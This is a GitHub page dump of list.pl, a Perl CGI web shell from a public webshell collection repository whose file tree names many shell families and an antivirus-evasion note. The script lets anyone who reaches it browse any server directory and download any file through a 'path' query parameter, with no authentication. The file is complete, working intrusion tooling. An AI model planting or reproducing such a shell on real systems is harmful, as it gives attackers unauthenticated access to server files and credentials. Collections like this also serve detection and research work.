{"payload":{"allShortcutsEnabled":false,"fileTree":{"fuzzdb-webshell/pl-cgi":{"items":[{"name":"cmd.pl","path":"fuzzdb-webshell/pl-cgi/cmd.pl","contentType":"file"},{"name":"list.pl","path":"fuzzdb-webshell/pl-cgi/list.pl","contentType":"file"},{"name":"perlcmd.cgi","path":"fuzzdb-webshell/pl-cgi/perlcmd.cgi","contentType":"file"},{"name":"up.pl","path":"fuzzdb-webshell/pl-cgi/up.pl","contentType":"file"}],"totalCount":4},"fuzzdb-webshell":{"items":[{"name":"asp","path":"fuzzdb-webshell/asp","contentType":"directory"},{"name":"c","path":"fuzzdb-webshell/c","contentType":"directory"},{"name":"cfm","path":"fuzzdb-webshell/cfm","contentType":"directory"},{"name":"jsp","path":"fuzzdb-webshell/jsp","contentType":"directory"},{"name":"php","path":"fuzzdb-webshell/php","contentType":"directory"},{"name":"pl-cgi","path":"fuzzdb-webshell/pl-cgi","contentType":"directory"},{"name":"servlet","path":"fuzzdb-webshell/servlet","contentType":"directory"},{"name":"sh","path":"fuzzdb-webshell/sh","contentType":"directory"},{"name":"README.md","path":"fuzzdb-webshell/README.md","contentType":"file"}],"totalCount":9},"":{"items":[{"name":".github","path":".github","contentType":"directory"},{"name":"0xAbbarhSF","path":"0xAbbarhSF","contentType":"directory"},{"name":"138shell","path":"138shell","contentType":"directory"},{"name":"AntSwordProject","path":"AntSwordProject","contentType":"directory"},{"name":"Backdoor Dev Shells","path":"Backdoor Dev Shells","contentType":"directory"},{"name":"Behinder","path":"Behinder","contentType":"directory"},{"name":"BlackArch","path":"BlackArch","contentType":"directory"},{"name":"DeEpinGh0st","path":"DeEpinGh0st","contentType":"directory"},{"name":"Godzilla","path":"Godzilla","contentType":"directory"},{"name":"JohnTroony","path":"JohnTroony","contentType":"directory"},{"name":"JoyChou93","path":"JoyChou93","contentType":"directory"},{"name":"LandGrey","path":"LandGrey","contentType":"directory"},{"name":"WangYihang","path":"WangYihang","contentType":"directory"},{"name":"antSword-shells","path":"antSword-shells","contentType":"directory"},{"name":"antSword","path":"antSword","contentType":"directory"},{"name":"asp","path":"asp","contentType":"directory"},{"name":"aspx","path":"aspx","contentType":"directory"},{"name":"b4tm4n-toolz","path":"b4tm4n-toolz","contentType":"directory"},{"name":"backlion","path":"backlion","contentType":"directory"},{"name":"bartblaze","path":"bartblaze","contentType":"directory"},{"name":"caidao-shell","path":"caidao-shell","contentType":"directory"},{"name":"content","path":"content","contentType":"directory"},{"name":"cseroad","path":"cseroad","contentType":"directory"},{"name":"docs","path":"docs","contentType":"directory"},{"name":"drag","path":"drag","contentType":"directory"},{"name":"fuzzdb-webshell","path":"fuzzdb-webshell","contentType":"directory"},{"name":"java","path":"java","contentType":"directory"},{"name":"jsp","path":"jsp","contentType":"directory"},{"name":"jspx","path":"jspx","contentType":"directory"},{"name":"lcatro","path":"lcatro","contentType":"directory"},{"name":"lhlsec","path":"lhlsec","contentType":"directory"},{"name":"malwares","path":"malwares","contentType":"directory"},{"name":"msmap","path":"msmap","contentType":"directory"},{"name":"net-friend","path":"net-friend","contentType":"directory"},{"name":"nodejs","path":"nodejs","contentType":"directory"},{"name":"oneoneplus","path":"oneoneplus","contentType":"directory"},{"name":"other","path":"other","contentType":"directory"},{"name":"php","path":"php","contentType":"directory"},{"name":"pl","path":"pl","contentType":"directory"},{"name":"py","path":"py","contentType":"directory"},{"name":"rec","path":"rec","contentType":"directory"},{"name":"tanjiti","path":"tanjiti","contentType":"directory"},{"name":"tdifg","path":"tdifg","contentType":"directory"},{"name":"threedr3am","path":"threedr3am","contentType":"directory"},{"name":"upsi1on","path":"upsi1on","contentType":"directory"},{"name":"vnhacker1337","path":"vnhacker1337","contentType":"directory"},{"name":"web-malware-collection-13-06-2012","path":"web-malware-collection-13-06-2012","contentType":"directory"},{"name":"webshell-free","path":"webshell-free","contentType":"directory"},{"name":"webshellpub","path":"webshellpub","contentType":"directory"},{"name":"wsMemShell","path":"wsMemShell","contentType":"directory"},{"name":"www-7jyewu-cn","path":"www-7jyewu-cn","contentType":"directory"},{"name":"xakep-shells","path":"xakep-shells","contentType":"directory"},{"name":"xl7dev","path":"xl7dev","contentType":"directory"},{"name":"zxc7528064","path":"zxc7528064","contentType":"directory"},{"name":".gitmodules","path":".gitmodules","contentType":"file"},{"name":"LICENSE","path":"LICENSE","contentType":"file"},{"name":"README.md","path":"README.md","contentType":"file"},{"name":"README_EN.md","path":"README_EN.md","contentType":"file"},{"name":"SECURITY.md","path":"SECURITY.md","contentType":"file"},{"name":"_config.yml","path":"_config.yml","contentType":"file"},{"name":"bt_yincang_shell.md","path":"bt_yincang_shell.md","contentType":"file"},{"name":"bypass.md","path":"bypass.md","contentType":"file"},{"name":"other shell repository.md","path":"other shell repository.md","contentType":"file"},{"name":"php_niu_3.php","path":"php_niu_3.php","contentType":"file"},{"name":"proxy.py","path":"proxy.py","contentType":"file"},{"name":"几种实战成功过的webshell的免杀方式.md","path":"几种实战成功过的webshell的免杀方式.md","contentType":"file"}],"totalCount":66}},"fileTreeProcessingTime":11.225035,"foldersToFetch":[],"reducedMotionEnabled":null,"repo":{"id":10238429,"defaultBranch":"master","name":"webshell","ownerLogin":"tennc","currentUserCanPush":false,"isFork":false,"isEmpty":false,"createdAt":"2013-05-23T07:37:56.000Z","ownerAvatar":"https://avatars.githubusercontent.com/u/670357?v=4","public":true,"private":false,"isOrgOwned":false},"refInfo":{"name":"master","listCacheKey":"v0:1680954097.0","canEdit":false,"refType":"branch","currentOid":"c4e7d5d2f4f685a9b3c85dd9e1ef548445edf0f4"},"path":"fuzzdb-webshell/pl-cgi/list.pl","currentUser":null,"blob":{"rawLines":["#!/usr/bin/perl","#","# PerlKit-0.1 - http://www.t0s.org","#","# browse.pl: Browse and download files from a webserver","","use strict;","","my ($path, %FORM);","","$|=1;","","","# Get parameters","","%FORM = parse_parameters($ENV{'QUERY_STRING'});","","if(defined $FORM{'path'}) {","  $path = $FORM{'path'};","","","} else {","  $path = \"/\";","}","","if(-f $path) { # Download selected file","  print \"Content-Type: application/octet-stream\\r\\n\";","  print \"\\r\\n\";","  open(FILE, \"< $path\") || print \"Could not open file\\n\";","","  while(<FILE>) {","    print;","  }","","  close(FILE);","  exit;","}","","print \"Content-Type: text/html\\r\\n\";","print \"\\r\\n\";","","print '<HTML>","<body>","<form action=\"\" method=\"GET\">","<input type=\"text\" name=\"path\" size=45 value=\"' . $path . '\">","<input type=\"submit\" value=\"List\">","</form>","Directory ' . $path . ' contents:","<p>","<font face=\"courier\">","<table>';","","if(defined $FORM{'path'}) {","","  opendir(DIR, $path) || print \"Could not open directory\";","","  foreach (sort(readdir(DIR))) {","    print get_fileinfo($path, $_). \"\\n\";","  }","","  closedir(DIR);","  ","}","","print \"</table></font>\";","","sub parse_parameters ($) {","  my %ret;","","  my $input = shift;","","  foreach my $pair (split('&', $input)) {","    my ($var, $value) = split('=', $pair, 2);","","    if($var) {","      $value =~ s/\\+/ /g ;","      $value =~ s/%(..)/pack('c',hex($1))/eg;","","      $ret{$var} = $value;","    }","  }","","  return %ret;","}","","sub get_fileinfo ($$) {","  my $ret;","","  my ($dir,$filename) = @_;","  my $file = $dir . \"/\" . $filename;","","  $file=~s/\\/+/\\//g;","","  $ret = \"<tr>\";","","  $ret .= \"<td>\";","","  if(-d $file) {","    $file=~s/\\/[^\\/]+\\/\\.\\./\\//g;","    $ret .= \"<a href=\\\"?path=$file\\\">$filename</a>\";","  } else {","    $ret .= \"$filename <a href=\\\"?path=$file\\\">[D]</a>\" ;","  }","  $ret .= \"</td>\";","","  my ($dev,$ino,$mode,$nlink,$uid,$gid,$rdev,$size, $atime,$mtime,$ctime,$blksize,$blocks) = stat($file);","","  $ret .= \"<td width=30'>&nbsp;</td>\";","  $ret .= \"<td>$size</td>\";","  $ret .= \"<td>\". getpwuid($uid) .\"</td>\";","  $ret .= \"<td>\". getgrgid($gid) .\"</td>\";","","  $ret .= \"</tr>\";","","  return $ret;","}"],"stylingDirectives":[[{"start":0,"end":15,"cssClass":"pl-c"},{"start":0,"end":1,"cssClass":"pl-c"}],[{"start":0,"end":1,"cssClass":"pl-c"},{"start":0,"end":1,"cssClass":"pl-c"}],[{"start":0,"end":34,"cssClass":"pl-c"},{"start":0,"end":1,"cssClass":"pl-c"}],[{"start":0,"end":1,"cssClass":"pl-c"},{"start":0,"end":1,"cssClass":"pl-c"}],[{"start":0,"end":55,"cssClass":"pl-c"},{"start":0,"end":1,"cssClass":"pl-c"}],[],[{"start":0,"end":3,"cssClass":"pl-k"}],[],[{"start":0,"end":2,"cssClass":"pl-k"},{"start":4,"end":9,"cssClass":"pl-smi"},{"start":11,"end":16,"cssClass":"pl-smi"}],[],[{"start":0,"end":2,"cssClass":"pl-smi"}],[],[],[{"start":0,"end":16,"cssClass":"pl-c"},{"start":0,"end":1,"cssClass":"pl-c"}],[],[{"start":0,"end":5,"cssClass":"pl-smi"},{"start":25,"end":29,"cssClass":"pl-smi"},{"start":30,"end":44,"cssClass":"pl-s"},{"start":30,"end":31,"cssClass":"pl-pds"},{"start":43,"end":44,"cssClass":"pl-pds"}],[],[{"start":0,"end":2,"cssClass":"pl-k"},{"start":3,"end":10,"cssClass":"pl-c1"},{"start":11,"end":16,"cssClass":"pl-smi"},{"start":17,"end":23,"cssClass":"pl-s"},{"start":17,"end":18,"cssClass":"pl-pds"},{"start":22,"end":23,"cssClass":"pl-pds"}],[{"start":2,"end":7,"cssClass":"pl-smi"},{"start":10,"end":15,"cssClass":"pl-smi"},{"start":16,"end":22,"cssClass":"pl-s"},{"start":16,"end":17,"cssClass":"pl-pds"},{"start":21,"end":22,"cssClass":"pl-pds"}],[],[],[{"start":2,"end":6,"cssClass":"pl-k"}],[{"start":2,"end":7,"cssClass":"pl-smi"},{"start":10,"end":13,"cssClass":"pl-s"},{"start":10,"end":11,"cssClass":"pl-pds"},{"start":12,"end":13,"cssClass":"pl-pds"}],[],[],[{"start":0,"end":2,"cssClass":"pl-k"},{"start":3,"end":5,"cssClass":"pl-k"},{"start":6,"end":11,"cssClass":"pl-smi"},{"start":15,"end":39,"cssClass":"pl-c"},{"start":15,"end":16,"cssClass":"pl-c"}],[{"start":2,"end":7,"cssClass":"pl-c1"},{"start":8,"end":52,"cssClass":"pl-s"},{"start":8,"end":9,"cssClass":"pl-pds"},{"start":47,"end":51,"cssClass":"pl-cce"},{"start":51,"end":52,"cssClass":"pl-pds"}],[{"start":2,"end":7,"cssClass":"pl-c1"},{"start":8,"end":14,"cssClass":"pl-s"},{"start":8,"end":9,"cssClass":"pl-pds"},{"start":9,"end":13,"cssClass":"pl-cce"},{"start":13,"end":14,"cssClass":"pl-pds"}],[{"start":2,"end":6,"cssClass":"pl-c1"},{"start":13,"end":22,"cssClass":"pl-s"},{"start":13,"end":14,"cssClass":"pl-pds"},{"start":16,"end":21,"cssClass":"pl-smi"},{"start":21,"end":22,"cssClass":"pl-pds"},{"start":27,"end":32,"cssClass":"pl-c1"},{"start":33,"end":56,"cssClass":"pl-s"},{"start":33,"end":34,"cssClass":"pl-pds"},{"start":53,"end":55,"cssClass":"pl-cce"},{"start":55,"end":56,"cssClass":"pl-pds"}],[],[{"start":2,"end":7,"cssClass":"pl-k"}],[{"start":4,"end":9,"cssClass":"pl-c1"}],[],[],[{"start":2,"end":7,"cssClass":"pl-c1"}],[{"start":2,"end":6,"cssClass":"pl-k"}],[],[],[{"start":0,"end":5,"cssClass":"pl-c1"},{"start":6,"end":35,"cssClass":"pl-s"},{"start":6,"end":7,"cssClass":"pl-pds"},{"start":30,"end":34,"cssClass":"pl-cce"},{"start":34,"end":35,"cssClass":"pl-pds"}],[{"start":0,"end":5,"cssClass":"pl-c1"},{"start":6,"end":12,"cssClass":"pl-s"},{"start":6,"end":7,"cssClass":"pl-pds"},{"start":7,"end":11,"cssClass":"pl-cce"},{"start":11,"end":12,"cssClass":"pl-pds"}],[],[{"start":0,"end":5,"cssClass":"pl-c1"},{"start":6,"end":13,"cssClass":"pl-s"},{"start":6,"end":7,"cssClass":"pl-pds"}],[{"start":0,"end":6,"cssClass":"pl-s"}],[{"start":0,"end":29,"cssClass":"pl-s"}],[{"start":0,"end":47,"cssClass":"pl-s"},{"start":46,"end":47,"cssClass":"pl-pds"},{"start":50,"end":55,"cssClass":"pl-smi"},{"start":58,"end":61,"cssClass":"pl-s"},{"start":58,"end":59,"cssClass":"pl-pds"}],[{"start":0,"end":34,"cssClass":"pl-s"}],[{"start":0,"end":7,"cssClass":"pl-s"}],[{"start":0,"end":11,"cssClass":"pl-s"},{"start":10,"end":11,"cssClass":"pl-pds"},{"start":14,"end":19,"cssClass":"pl-smi"},{"start":22,"end":33,"cssClass":"pl-s"},{"start":22,"end":23,"cssClass":"pl-pds"}],[{"start":0,"end":3,"cssClass":"pl-s"}],[{"start":0,"end":21,"cssClass":"pl-s"}],[{"start":0,"end":8,"cssClass":"pl-s"},{"start":7,"end":8,"cssClass":"pl-pds"}],[],[{"start":0,"end":2,"cssClass":"pl-k"},{"start":3,"end":10,"cssClass":"pl-c1"},{"start":11,"end":16,"cssClass":"pl-smi"},{"start":17,"end":23,"cssClass":"pl-s"},{"start":17,"end":18,"cssClass":"pl-pds"},{"start":22,"end":23,"cssClass":"pl-pds"}],[],[{"start":2,"end":9,"cssClass":"pl-c1"},{"start":15,"end":20,"cssClass":"pl-smi"},{"start":25,"end":30,"cssClass":"pl-c1"},{"start":31,"end":57,"cssClass":"pl-s"},{"start":31,"end":32,"cssClass":"pl-pds"},{"start":56,"end":57,"cssClass":"pl-pds"}],[],[{"start":2,"end":9,"cssClass":"pl-k"},{"start":11,"end":15,"cssClass":"pl-c1"},{"start":16,"end":23,"cssClass":"pl-c1"}],[{"start":4,"end":9,"cssClass":"pl-c1"},{"start":23,"end":28,"cssClass":"pl-smi"},{"start":30,"end":32,"cssClass":"pl-smi"},{"start":35,"end":39,"cssClass":"pl-s"},{"start":35,"end":36,"cssClass":"pl-pds"},{"start":36,"end":38,"cssClass":"pl-cce"},{"start":38,"end":39,"cssClass":"pl-pds"}],[],[],[{"start":2,"end":10,"cssClass":"pl-c1"}],[],[],[],[{"start":0,"end":5,"cssClass":"pl-c1"},{"start":6,"end":23,"cssClass":"pl-s"},{"start":6,"end":7,"cssClass":"pl-pds"},{"start":22,"end":23,"cssClass":"pl-pds"}],[],[{"start":0,"end":3,"cssClass":"pl-k"},{"start":4,"end":20,"cssClass":"pl-en"}],[{"start":2,"end":4,"cssClass":"pl-k"},{"start":5,"end":9,"cssClass":"pl-smi"}],[],[{"start":2,"end":4,"cssClass":"pl-k"},{"start":5,"end":11,"cssClass":"pl-smi"},{"start":14,"end":19,"cssClass":"pl-c1"}],[],[{"start":2,"end":9,"cssClass":"pl-k"},{"start":10,"end":12,"cssClass":"pl-k"},{"start":13,"end":18,"cssClass":"pl-smi"},{"start":20,"end":25,"cssClass":"pl-c1"},{"start":26,"end":29,"cssClass":"pl-s"},{"start":26,"end":27,"cssClass":"pl-pds"},{"start":28,"end":29,"cssClass":"pl-pds"},{"start":31,"end":37,"cssClass":"pl-smi"}],[{"start":4,"end":6,"cssClass":"pl-k"},{"start":8,"end":12,"cssClass":"pl-smi"},{"start":14,"end":20,"cssClass":"pl-smi"},{"start":24,"end":29,"cssClass":"pl-c1"},{"start":30,"end":33,"cssClass":"pl-s"},{"start":30,"end":31,"cssClass":"pl-pds"},{"start":32,"end":33,"cssClass":"pl-pds"},{"start":35,"end":40,"cssClass":"pl-smi"}],[],[{"start":4,"end":6,"cssClass":"pl-k"},{"start":7,"end":11,"cssClass":"pl-smi"}],[{"start":6,"end":12,"cssClass":"pl-smi"},{"start":16,"end":20,"cssClass":"pl-sr"},{"start":16,"end":18,"cssClass":"pl-pds"},{"start":16,"end":17,"cssClass":"pl-c1"},{"start":18,"end":20,"cssClass":"pl-cce"},{"start":20,"end":23,"cssClass":"pl-sr"},{"start":20,"end":21,"cssClass":"pl-pds"},{"start":22,"end":23,"cssClass":"pl-pds"},{"start":23,"end":24,"cssClass":"pl-sr"},{"start":23,"end":24,"cssClass":"pl-pds"},{"start":23,"end":24,"cssClass":"pl-k"}],[{"start":6,"end":12,"cssClass":"pl-smi"},{"start":16,"end":23,"cssClass":"pl-sr"},{"start":16,"end":18,"cssClass":"pl-pds"},{"start":16,"end":17,"cssClass":"pl-c1"},{"start":23,"end":42,"cssClass":"pl-sr"},{"start":23,"end":24,"cssClass":"pl-pds"},{"start":37,"end":39,"cssClass":"pl-smi"},{"start":41,"end":42,"cssClass":"pl-pds"},{"start":42,"end":44,"cssClass":"pl-sr"},{"start":42,"end":44,"cssClass":"pl-pds"},{"start":42,"end":44,"cssClass":"pl-k"}],[],[{"start":6,"end":10,"cssClass":"pl-smi"},{"start":11,"end":15,"cssClass":"pl-smi"},{"start":19,"end":25,"cssClass":"pl-smi"}],[],[],[],[{"start":2,"end":8,"cssClass":"pl-k"},{"start":9,"end":13,"cssClass":"pl-smi"}],[],[],[{"start":0,"end":3,"cssClass":"pl-k"},{"start":4,"end":16,"cssClass":"pl-en"}],[{"start":2,"end":4,"cssClass":"pl-k"},{"start":5,"end":9,"cssClass":"pl-smi"}],[],[{"start":2,"end":4,"cssClass":"pl-k"},{"start":6,"end":10,"cssClass":"pl-smi"},{"start":11,"end":20,"cssClass":"pl-smi"},{"start":24,"end":26,"cssClass":"pl-smi"}],[{"start":2,"end":4,"cssClass":"pl-k"},{"start":5,"end":10,"cssClass":"pl-smi"},{"start":13,"end":17,"cssClass":"pl-smi"},{"start":20,"end":23,"cssClass":"pl-s"},{"start":20,"end":21,"cssClass":"pl-pds"},{"start":22,"end":23,"cssClass":"pl-pds"},{"start":26,"end":35,"cssClass":"pl-smi"}],[],[{"start":2,"end":7,"cssClass":"pl-smi"},{"start":9,"end":14,"cssClass":"pl-sr"},{"start":9,"end":11,"cssClass":"pl-pds"},{"start":9,"end":10,"cssClass":"pl-c1"},{"start":11,"end":13,"cssClass":"pl-cce"},{"start":14,"end":18,"cssClass":"pl-sr"},{"start":14,"end":15,"cssClass":"pl-pds"},{"start":15,"end":17,"cssClass":"pl-cce"},{"start":17,"end":18,"cssClass":"pl-pds"},{"start":18,"end":19,"cssClass":"pl-sr"},{"start":18,"end":19,"cssClass":"pl-pds"},{"start":18,"end":19,"cssClass":"pl-k"}],[],[{"start":2,"end":6,"cssClass":"pl-smi"},{"start":9,"end":15,"cssClass":"pl-s"},{"start":9,"end":10,"cssClass":"pl-pds"},{"start":14,"end":15,"cssClass":"pl-pds"}],[],[{"start":2,"end":6,"cssClass":"pl-smi"},{"start":10,"end":16,"cssClass":"pl-s"},{"start":10,"end":11,"cssClass":"pl-pds"},{"start":15,"end":16,"cssClass":"pl-pds"}],[],[{"start":2,"end":4,"cssClass":"pl-k"},{"start":5,"end":7,"cssClass":"pl-k"},{"start":8,"end":13,"cssClass":"pl-smi"}],[{"start":4,"end":9,"cssClass":"pl-smi"},{"start":11,"end":27,"cssClass":"pl-sr"},{"start":11,"end":13,"cssClass":"pl-pds"},{"start":11,"end":12,"cssClass":"pl-c1"},{"start":13,"end":15,"cssClass":"pl-cce"},{"start":17,"end":19,"cssClass":"pl-cce"},{"start":21,"end":27,"cssClass":"pl-cce"},{"start":27,"end":31,"cssClass":"pl-sr"},{"start":27,"end":28,"cssClass":"pl-pds"},{"start":28,"end":30,"cssClass":"pl-cce"},{"start":30,"end":31,"cssClass":"pl-pds"},{"start":31,"end":32,"cssClass":"pl-sr"},{"start":31,"end":32,"cssClass":"pl-pds"},{"start":31,"end":32,"cssClass":"pl-k"}],[{"start":4,"end":8,"cssClass":"pl-smi"},{"start":12,"end":51,"cssClass":"pl-s"},{"start":12,"end":13,"cssClass":"pl-pds"},{"start":21,"end":23,"cssClass":"pl-cce"},{"start":29,"end":34,"cssClass":"pl-smi"},{"start":34,"end":36,"cssClass":"pl-cce"},{"start":37,"end":46,"cssClass":"pl-smi"},{"start":50,"end":51,"cssClass":"pl-pds"}],[{"start":4,"end":8,"cssClass":"pl-k"}],[{"start":4,"end":8,"cssClass":"pl-smi"},{"start":12,"end":55,"cssClass":"pl-s"},{"start":12,"end":13,"cssClass":"pl-pds"},{"start":13,"end":22,"cssClass":"pl-smi"},{"start":31,"end":33,"cssClass":"pl-cce"},{"start":39,"end":44,"cssClass":"pl-smi"},{"start":44,"end":46,"cssClass":"pl-cce"},{"start":54,"end":55,"cssClass":"pl-pds"}],[],[{"start":2,"end":6,"cssClass":"pl-smi"},{"start":10,"end":17,"cssClass":"pl-s"},{"start":10,"end":11,"cssClass":"pl-pds"},{"start":16,"end":17,"cssClass":"pl-pds"}],[],[{"start":2,"end":4,"cssClass":"pl-k"},{"start":6,"end":10,"cssClass":"pl-smi"},{"start":11,"end":15,"cssClass":"pl-smi"},{"start":16,"end":21,"cssClass":"pl-smi"},{"start":22,"end":28,"cssClass":"pl-smi"},{"start":29,"end":33,"cssClass":"pl-smi"},{"start":34,"end":38,"cssClass":"pl-smi"},{"start":39,"end":44,"cssClass":"pl-smi"},{"start":45,"end":50,"cssClass":"pl-smi"},{"start":52,"end":58,"cssClass":"pl-smi"},{"start":59,"end":65,"cssClass":"pl-smi"},{"start":66,"end":72,"cssClass":"pl-smi"},{"start":73,"end":81,"cssClass":"pl-smi"},{"start":82,"end":89,"cssClass":"pl-smi"},{"start":93,"end":97,"cssClass":"pl-c1"},{"start":98,"end":103,"cssClass":"pl-smi"}],[],[{"start":2,"end":6,"cssClass":"pl-smi"},{"start":10,"end":37,"cssClass":"pl-s"},{"start":10,"end":11,"cssClass":"pl-pds"},{"start":36,"end":37,"cssClass":"pl-pds"}],[{"start":2,"end":6,"cssClass":"pl-smi"},{"start":10,"end":26,"cssClass":"pl-s"},{"start":10,"end":11,"cssClass":"pl-pds"},{"start":15,"end":20,"cssClass":"pl-smi"},{"start":25,"end":26,"cssClass":"pl-pds"}],[{"start":2,"end":6,"cssClass":"pl-smi"},{"start":10,"end":16,"cssClass":"pl-s"},{"start":10,"end":11,"cssClass":"pl-pds"},{"start":15,"end":16,"cssClass":"pl-pds"},{"start":18,"end":26,"cssClass":"pl-c1"},{"start":27,"end":31,"cssClass":"pl-smi"},{"start":34,"end":41,"cssClass":"pl-s"},{"start":34,"end":35,"cssClass":"pl-pds"},{"start":40,"end":41,"cssClass":"pl-pds"}],[{"start":2,"end":6,"cssClass":"pl-smi"},{"start":10,"end":16,"cssClass":"pl-s"},{"start":10,"end":11,"cssClass":"pl-pds"},{"start":15,"end":16,"cssClass":"pl-pds"},{"start":18,"end":26,"cssClass":"pl-c1"},{"start":27,"end":31,"cssClass":"pl-smi"},{"start":34,"end":41,"cssClass":"pl-s"},{"start":34,"end":35,"cssClass":"pl-pds"},{"start":40,"end":41,"cssClass":"pl-pds"}],[],[{"start":2,"end":6,"cssClass":"pl-smi"},{"start":10,"end":17,"cssClass":"pl-s"},{"start":10,"end":11,"cssClass":"pl-pds"},{"start":16,"end":17,"cssClass":"pl-pds"}],[],[{"start":2,"end":8,"cssClass":"pl-k"},{"start":9,"end":13,"cssClass":"pl-smi"}],[]],"csv":null,"csvError":null,"dependabotInfo":{"showConfigurationBanner":false,"configFilePath":null,"networkDependabotPath":"/tennc/webshell/network/updates","dismissConfigurationNoticePath":"/settings/dismiss-notice/dependabot_configuration_notice","configurationNoticeDismissed":null,"repoAlertsPath":"/tennc/webshell/security/dependabot","repoSecurityAndAnalysisPath":"/tennc/webshell/settings/security_analysis","repoOwnerIsOrg":false,"currentUserCanAdminRepo":false},"displayName":"list.pl","displayUrl":"https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/pl-cgi/list.pl?raw=true","headerInfo":{"blobSize":"1.93 KB","deleteInfo":{"deleteTooltip":"You must be signed in to make or propose changes"},"editInfo":{"editTooltip":"You must be signed in to make or propose changes"},"ghDesktopPath":"https://desktop.github.com","gitLfsPath":null,"onBranch":true,"shortPath":"62b28eb","siteNavLoginPath":"/login?return_to=https%3A%2F%2Fgithub.com%2Ftennc%2Fwebshell%2Fblob%2Fmaster%2Ffuzzdb-webshell%2Fpl-cgi%2Flist.pl","isCSV":false,"isRichtext":false,"toc":null,"lineInfo":{"truncatedLoc":"116","truncatedSloc":"80"},"mode":"file"},"image":false,"isCodeownersFile":null,"isValidLegacyIssueTemplate":false,"issueTemplateHelpUrl":"https://docs.github.com/articles/about-issue-and-pull-request-templates","issueTemplate":null,"discussionTemplate":null,"language":"Perl","large":false,"loggedIn":false,"newDiscussionPath":"/tennc/webshell/discussions/new","newIssuePath":"/tennc/webshell/issues/new","planSupportInfo":{"repoIsFork":null,"repoOwnedByCurrentUser":null,"requestFullPath":"/tennc/webshell/blob/master/fuzzdb-webshell/pl-cgi/list.pl","showFreeOrgGatedFeatureMessage":null,"showPlanSupportBanner":null,"upgradeDataAttributes":null,"upgradePath":null},"publishBannersInfo":{"dismissActionNoticePath":"/settings/dismiss-notice/publish_action_from_dockerfile","dismissStackNoticePath":"/settings/dismiss-notice/publish_stack_from_file","releasePath":"/tennc/webshell/releases/new?marketplace=true","showPublishActionBanner":false,"showPublishStackBanner":false},"renderImageOrRaw":false,"richText":null,"renderedFileInfo":null,"tabSize":8,"topBannersInfo":{"overridingGlobalFundingFile":false,"globalPreferredFundingPath":null,"repoOwner":"tennc","repoName":"webshell","showInvalidCitationWarning":false,"citationHelpUrl":"https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/creating-a-repository-on-github/about-citation-files","showDependabotConfigurationBanner":false,"actionsOnboardingTip":null},"truncated":false,"viewable":true,"workflowRedirectUrl":null,"symbols":{"timedOut":false,"notAnalyzed":true,"symbols":[]}},"copilotAccessInfo":null,"csrf_tokens":{"/tennc/webshell/branches":{"post":"n2cs5LaTrvXmy5zDOW-gZEQ7nxr5bZ33s6DHzCVVjz6cb9caS4r-FCnAqHTLxwmNIPsj7tfBYx7rYowfgIqvDQ"}}},"title":"webshell/fuzzdb-webshell/pl-cgi/list.pl at master · tennc/webshell","locale":"en"}